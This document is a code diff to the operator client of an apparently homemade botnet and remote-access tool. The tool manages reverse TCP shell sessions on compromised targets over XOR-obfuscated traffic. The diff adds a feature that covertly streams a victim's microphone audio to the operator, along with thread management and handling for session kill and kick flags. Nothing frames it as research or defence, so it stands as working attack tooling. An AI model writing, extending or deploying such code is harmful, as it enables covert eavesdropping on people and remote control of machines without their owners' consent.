@@ -6,6 +6,17 @@ import time
 import sys
 from pyspin.spin import Box1, Spinner
 import os
+import threading
+import pyaudio
+
+# Set up audio capture
+CHUNK_SIZE = 2048
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+stream = None
+is_playing_audio = False
+audio = pyaudio.PyAudio()
 
 class AdminShell:
     def __init__(self):
@@ -18,6 +29,12 @@ class AdminShell:
         self.TARGET_CLIENT = False
         self.TARGET_CLIENT_INFO = ""
         self.TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'
+        self.audio_playback_executed = False  # Flag to track if audio playback has been executed
+        self.audio_thread = None
+        self.stop_audio_thread = threading.Event()  # Create an Event to signal thread termination
+        self.audio_lock = threading.Lock()
+
+
 
     def initializeServerConnection(self):
         try:
@@ -80,7 +97,47 @@ class AdminShell:
             self.isAuthenticated = False
             print("Error")
 
+    def play_audio(self, AdminShellSocket):
+        global stream
+
+        while not self.stop_audio_thread.is_set():
+            try:
+                audio_chunk = AdminShellSocket.recv(4096)
+                if audio_chunk.startswith(b"AUD:"):
+                    audio_data = audio_chunk[4:]
+
+                    if not stream:
+                        stream = audio.open(format=FORMAT, channels=CHANNELS,
+                                            rate=RATE, output=True,
+                                            frames_per_buffer=CHUNK_SIZE)
+
+                    if not audio_data:
+                        break  # Audio playback finished, exit the loop
+
+                    stream.write(audio_data)
+
+            except socket.timeout:
+                print("Disconnected client due to timeout")
+                break  # Handle timeout and exit the loop
+            except Exception as e:
+                print(f"Error in audio playback: {e}")
+                break  # Handle other exceptions and exit the loop
+
+    def start_audio_playback_thread(self, AdminShellSocket):
+        if self.audio_thread is None:
+            self.stop_audio_thread.clear()  # Clear the stop signal
+            self.audio_thread = threading.Thread(target=self.play_audio, args=(AdminShellSocket,), name="Audio Tailsploit Thread")
+            self.audio_thread.start() 
+
+    def stop_audio_playback_thread(self):
+        if self.audio_thread is not None:
+            self.stop_audio_thread.set()  # Set the stop signal
+            self.audio_thread.join()  # Wait for the thread to finish
+            self.stop_audio_thread.clear()  # Clear the stop signal
+            self.audio_thread = None  # Reset the thread variable
+
     def adminShellSession(self, AdminShellSocket):
+
         if os.name == "nt":
             os.system('cls')
         else:
@@ -117,13 +174,19 @@ class AdminShell:
 
             if adminShell == "":
                 continue
-            if adminShell == "clear":
+            elif adminShell == "clear":
                 if os.name == "nt":
                     os.system('cls')
                 else:
                     os.system('clear')
                 continue
-                    
+            elif adminShell == "thread":
+                active_threads = threading.enumerate()
+                print("Active Threads:")
+                for thread in active_threads:
+                    print("- Thread Name:", thread.name)
+                continue
+            
             else:
                 if self.TARGET_CLIENT:
                     formatTargetMessage = f"{adminShell} --FLAG_REVERSE_SHELL_INFO {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
@@ -134,50 +197,80 @@ class AdminShell:
                     AdminShellSocket.send(adminShellXOR)
             while True:
                 try:
-                    ServerShellXOR = AdminShellSocket.recv(4096)
-                    ServerShell = self.handleXOREncryption(ServerShellXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
-                    if ServerShell == "test":
-                        self.TARGET_CLIENT = True
-                        print("TRUE")
-                        break
-                    elif "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED" in ServerShell:
-                        client_info, flag = ServerShell.split(" --FLAG_REVERSE_SELL ")
-                        REVERSE_SHELL_IP, REVERSE_SHELL_PORT = client_info.split(":")
-                        print(f"Connected to: {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}")
-                        self.TARGET_CLIENT = True
-                        self.TARGET_CLIENT_INFO = f"{REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
-                        if os.name == "nt":  # Windows
-                            os.system('cls')
-                        else:  # Linux, macOS, etc.
-                            os.system('clear')
-                        print("")
-                        print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Started Reverse Shell (TCP) Handler On {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}")
-                        print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Server Started.")
-                        print("")
-                        break
-                    elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
-                        print("")
-                        print("[*] You have been kicked from a server administrator.")
-                        print("")
-                        sys.exit(1)
-                    elif "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND" in ServerShell:
-                        print("")
-                        print(f"[{Fore.RED}-{Style.RESET_ALL} Cannot found this target.]")
-                        print("")
-                        break
-                    elif "--FLAG_REVERSE_SHELL_INFO REVERSE_SHELL_HANDLER_STATUS?STOPPED" in ServerShell:
-                        print("")
-                        print(f"[{Fore.RED}*{Style.RESET_ALL}] Stopping Reverse Shell (TCP) Handler Server. ({Fore.YELLOW}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.YELLOW}{REVERSE_SHELL_PORT}{Style.RESET_ALL})")
-                        print("")
-                        self.TARGET_CLIENT = None
-                        self.TARGET_CLIENT_INFO =""
-                        break
-                    elif ServerShell:
-                        print("")
-                        print(ServerShell)
-                        print("")
-                        break
-                    
+                    ServerShellXOR = AdminShellSocket.recv(1024)
+                    if ServerShellXOR.startswith(b"AUD:"):
+                        pass
+                    else:
+                        ServerShell = self.handleXOREncryption(ServerShellXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
+
+                        if "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED" in ServerShell:
+                            client_info, flag = ServerShell.split(" --FLAG_REVERSE_SELL ")
+                            REVERSE_SHELL_IP, REVERSE_SHELL_PORT = client_info.split(":")
+                            print(f"Connected to: {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}")
+                            self.TARGET_CLIENT = True
+                            self.TARGET_CLIENT_INFO = f"{REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
+                            if os.name == "nt":  # Windows
+                                os.system('cls')
+                            else:  # Linux, macOS, etc.
+                                os.system('clear')
+                            print("")
+                            print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Started Reverse Shell (TCP) Session Handler On {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}")
+                            print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Server Started.")
+                            print("")
+                            break
+                        elif "--FLAG_KILL_SESSION_REVERSE_TCP_SUCCESS" in ServerShell:
+                            self.TARGET_CLIENT = False
+                            print("")
+                            print(f"{Fore.RED}[*]{Style.RESET_ALL} Closing Reverse TCP Shell Session ({Fore.YELLOW}{REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}{Style.RESET_ALL})...")
+                            print("")
+                            break
+                        elif "--FLAG_AUDIO_STREAMING_STARTED" in ServerShell:
+                            print("")
+                            print(f"[{Fore.YELLOW}*{Style.RESET_ALL}] Initializing audio streaming to target...")
+                            if self.audio_thread is None or not self.audio_thread.is_alive():
+                                print(f"[{Fore.GREEN}*{Style.RESET_ALL}] You are listening to {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT} microphone.")
+                                print(f"Type 'stoplisten' to close the audio stream.")
+                                print("")
+                                self.start_audio_playback_thread(AdminShellSocket)
+                            else:
+                                print(f"[{Fore.RED}*{Style.RESET_ALL}] Microphone is already being listened to.")
+                            break
+                        elif "--FLAG_AUDIO_STREAMING_STOPPED" in ServerShell:
+                            print("\n")
+                            print(f"[{Fore.YELLOW}*{Style.RESET_ALL}] Stopping microphone listening...")
+                            if self.audio_thread is not None and self.audio_thread.is_alive():
+                                print(f"[{Fore.RED}*{Style.RESET_ALL}] Audio stream closed.")
+                                print("\n")
+                                self.stop_audio_playback_thread()
+                                print("test")
+                                break
+                            else:
+                                print("Microphone is not being listened to.")
+                            break
+                        elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
+                            print("")
+                            print("[*] You have been kicked from the server by a server administrator.")
+                            print("")
+                            sys.exit(1)
+                        elif "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND" in ServerShell:
+                            print("")
+                            print(f"[{Fore.RED}-{Style.RESET_ALL} Cannot found this target.]")
+                            print("")
+                            break
+                        elif "--FLAG_REVERSE_SHELL_INFO REVERSE_SHELL_HANDLER_STATUS?STOPPED" in ServerShell:
+                            print("")
+                            print(f"[{Fore.RED}*{Style.RESET_ALL}] Stopping Reverse Shell (TCP) Handler Server. ({Fore.YELLOW}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.YELLOW}{REVERSE_SHELL_PORT}{Style.RESET_ALL})")
+                            print("")
+                            self.TARGET_CLIENT = None
+                            self.TARGET_CLIENT_INFO =""
+                            break
+                        elif ServerShell:
+                            print("")
+                            print(ServerShell)
+                            print("")
+                            break
+                except Exception as e:
+                    pass
                 except KeyboardInterrupt:
                     print("[INFO] Admin terminated the connection.")
                     AdminShellSocket.close()
